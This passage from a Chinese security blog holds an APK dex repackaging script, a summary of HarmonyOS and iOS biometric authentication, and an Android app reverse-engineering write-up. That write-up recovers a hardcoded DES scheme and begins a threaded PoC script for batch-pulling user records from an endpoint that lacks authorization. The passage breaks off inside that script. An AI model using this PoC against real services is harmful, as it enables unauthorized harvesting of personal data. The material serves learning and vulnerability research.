class="hljs-keyword">in</span> fz.namelist():<br>            <span class="hljs-keyword">if</span> file.startswith(<span class="hljs-string">&#x27;META-INF&#x27;</span>):<br>                fz.extract(file, target_path)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[-] %s 不是一个APK文件&#x27;</span> % apk_path)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">zip_dir</span>(<span class="hljs-params">dirname, zipfilename</span>):<br>    filelist = []<br>    <span class="hljs-keyword">if</span> os.path.isfile(dirname):<br>        <span class="hljs-keyword">if</span> dirname.endswith(<span class="hljs-string">&#x27;.dex&#x27;</span>):<br>            filelist.append(dirname)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> root, dirs, files <span class="hljs-keyword">in</span> os.walk(dirname):<br>            <span class="hljs-keyword">for</span> <span class="hljs-built_in">dir</span> <span class="hljs-keyword">in</span> dirs:<br>                filelist.append(os.path.join(root, <span class="hljs-built_in">dir</span>))<br>            <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> files:<br>                filelist.append(os.path.join(root, name))<br><br>    z = zipfile.ZipFile(zipfilename, <span class="hljs-string">&#x27;w&#x27;</span>, zipfile.ZIP_DEFLATED)<br>    <span class="hljs-keyword">for</span> tar <span class="hljs-keyword">in</span> filelist:<br>        arcname = tar[<span class="hljs-built_in">len</span>(dirname):]<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;META-INF&#x27;</span> <span class="hljs-keyword">in</span> arcname <span class="hljs-keyword">or</span> arcname.endswith(<span class="hljs-string">&#x27;.dex&#x27;</span>)) <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;.DS_Store&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> arcname:<br>            <span class="hljs-comment"># print(tar + &quot; --&gt;rar: &quot; + arcname)</span><br>            z.write(tar, arcname)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] APK打包成功，你可以拖入APK进行分析啦！&#x27;</span>)<br>    z.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    args = &#123;<br>        <span class="hljs-string">&#x27;dex_path&#x27;</span>: <span class="hljs-string">&#x27;./&#x27;</span>, <span class="hljs-comment"># 脱壳后的dex文件目录</span><br>        <span class="hljs-string">&#x27;apk_path&#x27;</span>: <span class="hljs-string">&#x27;./ori.apk&#x27;</span>, <span class="hljs-comment"># 原始的apk目录</span><br>        <span class="hljs-string">&#x27;output&#x27;</span>: <span class="hljs-string">&#x27;./output.apk&#x27;</span> <span class="hljs-comment"># 输出打包后的apk目录</span><br>    &#125;<br><br>    rename_class(args[<span class="hljs-string">&#x27;dex_path&#x27;</span>])<br>    extract_META_INF_from_apk(args[<span class="hljs-string">&#x27;apk_path&#x27;</span>], args[<span class="hljs-string">&#x27;dex_path&#x27;</span>])<br>    zip_dir(args[<span class="hljs-string">&#x27;dex_path&#x27;</span>], args[<span class="hljs-string">&#x27;output&#x27;</span>])<br><br></code></pre></td></tr></table></figure><h2 id="Jadx分析脱壳后的Class文件"><a href="#Jadx分析脱壳后的Class文件" class="headerlink" title="Jadx分析脱壳后的Class文件"></a>Jadx分析脱壳后的Class文件</h2><p>运行Jadx-gui，将导出的Classes.dex文件拖到窗口，如果报错dex校验和校验失败就点击File-&gt;Preferences，将checksum选项改为no：</p><p><img src="/images/image-20231125195616901.png"></p><p>然后就得到了源代码，可以用于审计：</p><p><img src="/images/image-20231125200019474.png"></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>中间其实有尝试使用ida去逆向，参考的<a href="https://zhuanlan.zhihu.com/p/478322871">某APP加固产品的深入分析 - 知乎 (zhihu.com)</a>，但是由于ida用的不熟，混淆的逻辑也比较复杂，暂时没有使用该方法成功脱壳，未来仍需努力</p>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>终端安全白皮书--身份认证</title>
    <link href="/blog/2023/11/20/%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%99%BD%E7%9A%AE%E4%B9%A6-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81/"/>
    <url>/blog/2023/11/20/%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%99%BD%E7%9A%AE%E4%B9%A6-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81/</url>
    
    <content type="html"><![CDATA[<p><strong>最近读了<a href="https://help.apple.com/pdf/security/zh_CN/apple-platform-security-guide-cn.pdf">苹果终端安全白皮书</a>和<a href="https://consumer.huawei.com/content/dam/huawei-cbg-site/cn/mkt/privacy/privary-new/down/HarmonyOS%203.0.0%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%99%BD%E7%9A%AE%E4%B9%A6%E6%96%87%E6%A1%A3.pdf">鸿蒙OS安全技术白皮书</a>，记录一下其中身份认证相关的一些行业技术手段。</strong></p><p><img src="/images/fj71.jpg"></p><span id="more"></span><h2 id="HarmonyOS-“正确的人”"><a href="#HarmonyOS-“正确的人”" class="headerlink" title="HarmonyOS “正确的人”"></a>HarmonyOS “正确的人”</h2><p>鸿蒙OS除了提供传统的数字密码、图形密码等身份认证方式之外，还提供了指纹识别、人脸识别等生物认证手段，并且提供了分布式协同认证的能力，使用户可便捷地以近端设备为入口完成用户身份认证。</p><h3 id="指纹认证"><a href="#指纹认证" class="headerlink" title="指纹认证"></a>指纹认证</h3><p>鸿蒙OS目前提供了电容指纹、光学指纹以及超声指纹识别的支持，三种技术方案的体验及安全能力基本一致。</p><p><img src="/images/image-20231120180050366.png" alt="指纹识别安全框架"></p><p>鸿蒙OS在指纹传感器和iTrustee之间建立安全通道，确保指纹图像安全地传递，特征提取、活体检测、特征比对完全在iTrustee中进行，基于可信区域进行安全隔离。指纹服务只负责指纹的认证发起和认证结果获取，不接触原始指纹数据。</p><p>指纹模板录入时，特征数据通过iTrustee的安全存储进行保存，并且采用高强度的密码算法加密和完整性保护。指纹数据仅存在于iTrustee，外部应用无法获取指纹的原始数据。</p><p>指纹识别错误接受率大约1&#x2F;50000。鸿蒙OS 的指纹识别支持防暴力破解机制，亮屏场景下指纹识别连续错误 5 次，或熄屏场景下指纹识别连续错误 10 次，将锁定 30 秒不能进行指纹识别。如果指纹识别连续失败 20 次，则必须使用密码来解锁设备。</p><p>72小时未使用密码解锁设备会强制用户输入密码解锁，增强用户对密码的记忆（MIUI等其他OS也是这么做的）。</p><h3 id="人脸认证"><a href="#人脸认证" class="headerlink" title="人脸认证"></a>人脸认证</h3><p>鸿蒙OS提供2D和3D人脸识别方案，3D人脸识别依赖特殊的深度摄像头来实现，2D识别基于普通的前置摄像头来实现。3D人脸识别的安全性更高，可以支持原生支付应用。</p><p><img src="/images/image-20231120183120016.png" alt="人脸识别安全框架图"></p><p>存储和录入过程与指纹类似，也是在可信区域进行加密存储。</p><p>人脸识别3D方案的错误接受率大约1&#x2F;3000000，2D方案与指纹类似，在1&#x2F;50000-1&#x2F;100000。人脸识别连续错误5次必须输入密码解锁。双胞胎、亲属、未满13岁儿童错误匹配概率会增加，并且摄像头采集数据可能无法分辨制作精良的头模。</p><h3 id="分布式协同认证"><a href="#分布式协同认证" class="headerlink" title="分布式协同认证"></a>分布式协同认证</h3><p>鸿蒙OS构建了分布式身份认证能力，用户可以将手边最便携的同等安全级别的设备作为访问入口与身份认证入口。</p><h4 id="基于用户秘密的分布式认证"><a href="#基于用户秘密的分布式认证" class="headerlink" title="基于用户秘密的分布式认证"></a>基于用户秘密的分布式认证</h4><p>在设备已经建立可信关系前提下，鸿蒙OS支持身份认证数据采集端和认证端的解耦，采集端提供采集信息和对认证信息的脱敏处理能力，认证端提供认证凭据的比对能力，两端通过PAKE协议（Password-authenticated key agreement，密码认证秘钥协商，窃听者或者中间人无法在不与其他方互动的情况下暴力破解密码，<a href="https://en.wikipedia.org/wiki/Password-authenticated_key_agreement%EF%BC%89%E5%AE%8C%E6%88%90%E5%88%86%E5%B8%83%E5%BC%8F%E8%AE%A4%E8%AF%81%EF%BC%8C%E4%BD%BF%E7%94%A8%E6%88%B7%E7%A7%98%E5%AF%86%E5%8F%AF%E4%BB%A5%E5%9C%A8%E6%97%A0%E9%9C%80%E4%BC%A0%E8%BE%93%E5%88%B0%E5%AF%B9%E7%AB%AF%E6%83%85%E5%86%B5%E4%B8%8B%E5%AE%8C%E6%88%90%E8%BF%9C%E7%A8%8B%E8%AE%A4%E8%AF%81%E3%80%82">https://en.wikipedia.org/wiki/Password-authenticated_key_agreement）完成分布式认证，使用户秘密可以在无需传输到对端情况下完成远程认证。</a></p><p>为了保证采集端与认证端的信息来自合法的安全模块，鸿蒙OS的分布式秘密认证服务会在采集端和认证端设备各自本地的可信环境内生成执行器的身份标识，该身份标识是一个Ed25519（ed25519是一种EdDSA签名，基于SHA-512和Curve25519）公私钥对，用于在远程秘密认证过程中在采集器和认证器之间签名本地传出的数据，验证对方传入的数据。</p><p>身份认证信息在采集设备上完成数据采集和脱敏处理后，在可信环境中生成PAKE认证协议字段，并使用采集端身份标识的私钥对协议字段数据进行签名，之后通过基于设备间的可信关系的端到端加密安全通道传输到认证设备，在认证设备的可信环境中验证签名后完成PAKE认证过程</p><h4 id="基于可信持有物的分布式认证"><a href="#基于可信持有物的分布式认证" class="headerlink" title="基于可信持有物的分布式认证"></a>基于可信持有物的分布式认证</h4><p>用户绑定的蓝牙配件可作为“可信持有物”，以认证用户身份。协同认证提供多因子叠加的增强认证能力，当蓝牙设备连接到待解锁设备并处于佩戴状态时，可以用于解锁设备。当使用该蓝牙配件对用户发起认证时，协同认证将判断蓝牙配件的连接状态、蓝牙配件与手机的距离、并基于持续佩戴 TOKEN 发起手机与配件间的持续佩戴检测， 当三个因子同时满足要求时，才会认证成功。  </p><h2 id="IOS身份认证"><a href="#IOS身份认证" class="headerlink" title="IOS身份认证"></a>IOS身份认证</h2><p>密码是Apple设备安全性的基础，同时用户需要能便捷地访问自己的设备，通常一天会访问上百次。生物认证兼具强密码的安全性同时提供了便利性，只需要手指轻轻一按或者看一眼就可以快速解锁。面容ID和触控ID不会取代密码，而是在大多数情况下实现更快和更简单的访问。</p><p>Apple的生物识别安全性架构依赖于生物识别传感器和安全隔离区之间严格的职责独立性和二者之间的安全的关联性。传感器会捕捉生物识别图像并将其安全传输到安全隔离区（与上面的鸿蒙OS基本一致），同样，这样的架构支持包含传感器和安全隔离区的设备，并且支持将传感器在物理上独立于外围设备，然后与搭载Apple芯片的Mac中的安全隔离区安全配对（类似于鸿蒙OS的分布协同认证）</p><h3 id="面容ID"><a href="#面容ID" class="headerlink" title="面容ID"></a>面容ID</h3><p>借助于原深感摄像头系统所使用的先进技术来准确绘制用户面部的几何特征，从而提供安全直观的认证方法。使用神经网络来确认用户对屏幕的注视、匹配和反欺诈。用户只需要看一眼即可解锁手机，使用支持的设备时，甚至带着口罩也能解锁，并且可以自适应外貌变化，并谨慎的保护用户生物识别数据的隐私和安全。</p><p>在需要用到面容ID时摄像头首先会检测用户的脸部，检测到脸部后面容ID通过检测到用户<strong>睁开双眼注释设备</strong>来确认用户是否有解锁意图；对于辅助功能，当“旁白”激活时，注视检测会停用；戴口罩使用时始终会检测注视</p><p>原深感摄像头确认存在注视着设备的脸部后，会投影并读取数千个红外点以绘制脸部的深度图和 2D 红外图像。此数据用于创建一个 2D 图像和深度图序列，经过数字签名后发送到安全隔区。为抵制数字和实体诈骗，原深感摄像头会随机化捕捉到的 2D 图像和深度图序列，并投影出特定设备的随机图案。神经网络引擎（在安全隔区中受到保护）中的一部分会将此数据转换为数学表达式，并将该表达式与注册的脸部数据进行对比。此注册的脸部数据本身就是捕捉自用户脸部各种姿态转换而成的数学表达式。</p><h3 id="触控ID"><a href="#触控ID" class="headerlink" title="触控ID"></a>触控ID</h3><p>指纹传感器检测到指纹接触后，会触发先进的成像阵列来扫描手指，然后将扫描结果发送至安全隔区。用于保护这种连接的通道各有不同，具体取决于触控 ID 传感器是否内建于带安全隔区的设备中或者是否处于独立的外围设备中。</p><p> 指纹扫描被向量化处理以进行分析的同时，光栅扫描结果会临时储存在安全隔区的加密内存中，之后便会被丢弃。 此分析采用皮下纹路走向角度映射，这是一种有损过程，会在分析完成后丢弃所需用于重建用户实际指纹的“指纹详细数据”。在注册期间，生成的节点图以一种只能由安全隔区读取的加密格式作为模板储存，但不包含任何身份信息， 以用于对比将来的匹配对象。此数据绝对不会离开设备，不会发送给 Apple，也不会包括在设备备份中。</p><p>大家方案基本都差不多。</p><h2 id="科研领域的一些智能手机上的认证技术"><a href="#科研领域的一些智能手机上的认证技术" class="headerlink" title="科研领域的一些智能手机上的认证技术"></a>科研领域的一些智能手机上的认证技术</h2><h3 id="手势认证-Gesture-authentication"><a href="#手势认证-Gesture-authentication" class="headerlink" title="手势认证(Gesture authentication)"></a>手势认证(Gesture authentication)</h3><p><a href="https://ieeexplore.ieee.org/abstract/document/9152710">Gesture Authentication for Smartphones: Evaluation of Gesture Password Selection Policies | IEEE Conference Publication | IEEE Xplore</a></p><h3 id="运动和触摸状态"><a href="#运动和触摸状态" class="headerlink" title="运动和触摸状态"></a>运动和触摸状态</h3><p><a href="https://ieeexplore.ieee.org/abstract/document/9852519">Hold On and Swipe: A Touch-Movement Based Continuous Authentication Schema based on Machine Learning | IEEE Conference Publication | IEEE Xplore</a></p><h3 id="声音和唇部动作"><a href="#声音和唇部动作" class="headerlink" title="声音和唇部动作"></a>声音和唇部动作</h3><p><a href="https://ieeexplore.ieee.org/abstract/document/8851272">LVID: A Multimodal Biometrics Authentication System on Smartphones | IEEE Journals &amp; Magazine | IEEE Xplore</a></p><h3 id="步态、击键等等"><a href="#步态、击键等等" class="headerlink" title="步态、击键等等"></a>步态、击键等等</h3>]]></content>
    
    
    
    <tags>
      
      <tag>身份认证</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一次对Android APP简单的逆向分析</title>
    <link href="/blog/2023/11/19/%E4%B8%80%E6%AC%A1%E5%AF%B9Android-APP%E7%AE%80%E5%8D%95%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    <url>/blog/2023/11/19/%E4%B8%80%E6%AC%A1%E5%AF%B9Android-APP%E7%AE%80%E5%8D%95%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p><strong>一个非常简单的APP逆向分析，学习一下Android应用的分析。</strong></p><p><img src="/images/fj70.jpg"></p><span id="more"></span><h2 id="Apktool"><a href="#Apktool" class="headerlink" title="Apktool"></a>Apktool</h2><p>Apktool是一种用于对第三方、封闭的二进制 Android 应用程序进行逆向工程的工具。它可以将资源解码为接近原始形式，并在进行一些修改后重建它们；它可以逐步调试 SMALI 代码；此外，由于类似项目的文件结构和一些重复性任务（如构建 apk 等）的自动化，它使使用应用程序变得更加容易。</p><p>下载链接（Github）：<a href="https://github.com/iBotPeaches/Apktool/releases/">Releases · iBotPeaches&#x2F;Apktool (github.com)</a></p><h3 id="解包"><a href="#解包" class="headerlink" title="解包"></a>解包</h3><p>执行下面的命令即可，base.apk是需要解包的apk文件，-o指定输出目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar apktool.jar d base.apk -o base<br></code></pre></td></tr></table></figure><p><img src="/images/apktool.png"></p><h3 id="寻找接口"><a href="#寻找接口" class="headerlink" title="寻找接口"></a>寻找接口</h3><p>手机代理到电脑上的burpsuite代理端口，即可对手机上一些走系统代理的应用进行抓包，这个APP恰好走系统代理，并且是http协议发包，无需安装证书：</p><p><img src="/images/bp-app.png"></p><p>尝试在手机上访问一些接口，就可以得到一些接口数据：</p><p>然后可以看到，请求数据包和响应都是加密的：</p><p><img src="/images/encryptdata.png"></p><p>这时候看起来没啥办法继续分析报文了，暂不考虑暴力解密，我们就从逆向的smali文件中找找线索，直接搜索接口名字发现APP完全没有做任何混淆，可以找到下面内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Desktop/base/smali]<br>└─$ grep -r <span class="hljs-string">&quot;xxxxxService&quot;</span> <br>com/dses/camp******/common/DataUtils.smali:    const-string v4, <span class="hljs-string">&quot;/xxxxxService&quot;</span><br>com/dses/camp******/common/DataUtils.smali:    const-string v6, <span class="hljs-string">&quot;/xxxxxService&quot;</span><br>com/dses/camp******/common/DataUtils.smali:    const-string v6, <span class="hljs-string">&quot;/xxxxxService&quot;</span><br></code></pre></td></tr></table></figure><p>找到以上目录，我们可以发现下列内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Desktop/base/smali]<br>└─$ <span class="hljs-built_in">cd</span> com/dses/camp******/common/                  <br>                                                                                                           <br>┌──(kali㉿kali)-[~/…/com/dses/camp******/common]<br>└─$ <span class="hljs-built_in">ls</span><br>DataManager.smali  DES.smali                  Global.smali<br>DataUtils.smali    FileUtils.smali            MyResponseHandler.smali<br>GlideRoundTransform.smali  PersistenceCacheScope.smali<br><br></code></pre></td></tr></table></figure><p>看到了一个可疑的DES文件，初步怀疑是使用了DES加密。</p><h2 id="smali2java"><a href="#smali2java" class="headerlink" title="smali2java"></a>smali2java</h2><p>smali2java是一个将smali代码翻译成java代码的工具</p><p>一个Github下载链接：<a href="https://github.com/AlexeySoshin/smali2java/releases">Releases · AlexeySoshin&#x2F;smali2java (github.com)</a></p><p>前面已经使用apktool将apk反编译成smali代码，并且我们发现了一个DES.smali代码，疑似加密用途，下面我们就将该代码翻译成Java代码更容易阅读：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#下载解压之后如果没有运行权限需要给程序添加可执行权限</span><br><span class="hljs-built_in">chmod</span> +x smali2java_linux_amd64<br><span class="hljs-comment">#翻译smali代码</span><br>./smali2java_linux_amd64 -path_to_smali=./base/smali/com/dses/camp******/common/DES.smali<br></code></pre></td></tr></table></figure><p>然后我们就在smali目录下看到了翻译好的java代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">com</span>.dses.camp******.common.DES &#123;<br> <span class="hljs-comment">/* .source &quot;DES.java&quot; */</span><br> <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> java.lang.String DESKey;<br> <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> iv;<br> <span class="hljs-keyword">static</span> com.dses.camp******.common.DES ( ) &#123;<br> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">v0</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;密钥&quot;</span>;<br> <span class="hljs-keyword">return</span>;<br> &#125; <span class="hljs-comment">// .end array-data</span><br>&#125; <span class="hljs-comment">// .end method</span><br><span class="hljs-keyword">public</span> com.dses.camp******.common.DES ( ) &#123;<br> <span class="hljs-keyword">return</span>;<br>&#125; <span class="hljs-comment">// .end method</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> java.lang.String <span class="hljs-title function_">decryptDES</span> <span class="hljs-params">( java.lang.String p0 )</span> &#123;<br>&#125; <span class="hljs-comment">// .end annotation</span><br><span class="hljs-type">int</span> <span class="hljs-variable">v5</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// const/4 v5, 0x0</span><br>com.cbs.utils.F$Base64 .base64Decode ( p0,v5 );<br>v5 = com.dses.camp******.common.DES.iv;<br>v5 = com.dses.camp******.common.DES.DESKey;<br>(( java.lang.String ) v5 ).getBytes ( ); <span class="hljs-comment">// invoke-virtual &#123;v5&#125;, Ljava/lang/String;-&gt;getBytes()[B</span><br><span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">v6</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;DES&quot;</span>; <span class="hljs-comment">// const-string v6, &quot;DES&quot;</span><br><span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">v5</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;DES/CBC/PKCS5Padding&quot;</span>; <span class="hljs-comment">// const-string v5, &quot;DES/CBC/PKCS5Padding&quot;</span><br>javax.crypto.Cipher .getInstance ( v5 );<br><span class="hljs-type">int</span> <span class="hljs-variable">v5</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>; <span class="hljs-comment">// const/4 v5, 0x2</span><br>(( javax.crypto.Cipher ) v1 ).init ( v5, v3, v4 ); <span class="hljs-comment">// invoke-virtual &#123;v1, v5, v3, v4&#125;, </span><br>(( javax.crypto.Cipher ) v1 ).doFinal ( v0 ); <span class="hljs-comment">// invoke-virtual &#123;v1, v0&#125;, </span><br><span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">v6</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;gbk&quot;</span>; <span class="hljs-comment">// const-string v6, &quot;gbk&quot;</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> java.lang.String <span class="hljs-title function_">encryptDES</span> <span class="hljs-params">( java.lang.String p0 )</span> &#123;<br>v4 = com.dses.camp******.common.DES.iv;<br>v4 = com.dses.camp******.common.DES.DESKey;<br>(( java.lang.String ) v4 ).getBytes ( ); <span class="hljs-comment">// invoke-virtual &#123;v4&#125;, Ljava/lang/String;-&gt;getBytes()[B</span><br><span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">v5</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;DES&quot;</span>; <span class="hljs-comment">// const-string v5, &quot;DES&quot;</span><br><span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">v4</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;DES/CBC/PKCS5Padding&quot;</span>; <span class="hljs-comment">// const-string v4, &quot;DES/CBC/PKCS5Padding&quot;</span><br>javax.crypto.Cipher .getInstance ( v4 );<br><span class="hljs-type">int</span> <span class="hljs-variable">v4</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; <span class="hljs-comment">// const/4 v4, 0x1</span><br>(( javax.crypto.Cipher ) v0 ).init ( v4, v2, v3 ); <span class="hljs-comment">// invoke-virtual &#123;v0, v4, v2, v3&#125;, </span><br><span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">v4</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;gbk&quot;</span>; <span class="hljs-comment">// const-string v4, &quot;gbk&quot;</span><br>(( java.lang.String ) p0 ).getBytes ( v4 ); <span class="hljs-comment">// invoke-virtual &#123;p0, v4&#125;, </span><br>(( javax.crypto.Cipher ) v0 ).doFinal ( v4 ); <span class="hljs-comment">// invoke-virtual &#123;v0, v4&#125;, </span><br><span class="hljs-type">int</span> <span class="hljs-variable">v5</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>; <span class="hljs-comment">// const/4 v5, 0x2</span><br>com.cbs.utils.F$Base64 .base64Encode ( v1,v5 );<br>&#125; <br><br></code></pre></td></tr></table></figure><p>以上代码翻译的可能不是完全正确，但是我们可以大致分析出数据包采用了DES加密，加密模式为CBC，初始化向量为固定值0x0，数据的编码方式为gbk，padding的方式为PKCS5Padding，并且加密的结果是经过base64编码的。</p><p>随后我们根据这个加密规则进行解密，成功将密文解密，然后发现没有进行任何鉴权，直接通过userid去查询用户的所有信息，那么我们就可以使用下面的poc脚本批量获取接口数据了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># poc.py</span><br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> DES<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><span class="hljs-keyword">import</span> concurrent.futures<br><br><span class="hljs-comment"># 全局锁，用于确保对文件的写入操作是线程安全的</span><br>file_write_lock = threading.Lock()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_post_request</span>(<span class="hljs-params">url, data</span>):<br>    headers = &#123;<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>    &#125;<br>    response = requests.post(url, headers=headers, data=data)<br><br>    <span class="hljs-keyword">return</span> response<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-comment"># PKCS padding</span><br>    pad_size = <span class="hljs-number">8</span> - (<span class="hljs-built_in">len</span>(text) % <span class="hljs-number">8</span>)<br>    <span class="hljs-keyword">return</span> text + <span class="hljs-built_in">bytes</span>([pad_size] * pad_size)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">des_encrypt</span>(<span class="hljs-params">key, data</span>):<br>    iv = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x00</span>] * <span class="hljs-number">8</span>)  <span class="hljs-comment"># Generate a random IV for CBC mode</span><br>    cipher = DES.new(key, DES.MODE_CBC, iv)<br>    padded_data = pad(data)<br>    encrypted_data = cipher.encrypt(padded_data)<br>    <span class="hljs-keyword">return</span> encrypted_data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">des_decrypt</span>(<span class="hljs-params">data, key</span>):<br>    iv = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x00</span>] * <span class="hljs-number">8</span>)  <span class="hljs-comment"># Generate a random IV for CBC mode</span><br>    cipher = DES.new(key, DES.MODE_CBC, iv)<br>    encrypted_data = base64.b64decode(data)<br>    decrypted_data = cipher.decrypt(encrypted_data)<br>    pad_size = decrypted_data[-<span class="hljs-number">1</span>]<br>    decrypted_data = decrypted_data[:-pad_size]<br>    <span class="hljs-keyword">return</span> decrypted_data.decode(<span class="hljs-string">&#x27;gb2312&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_string_value</span>(<span class="hljs-params">xml_string, key</span>):<br>    encrypted_string = xml_string.replace(<span class="hljs-string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span 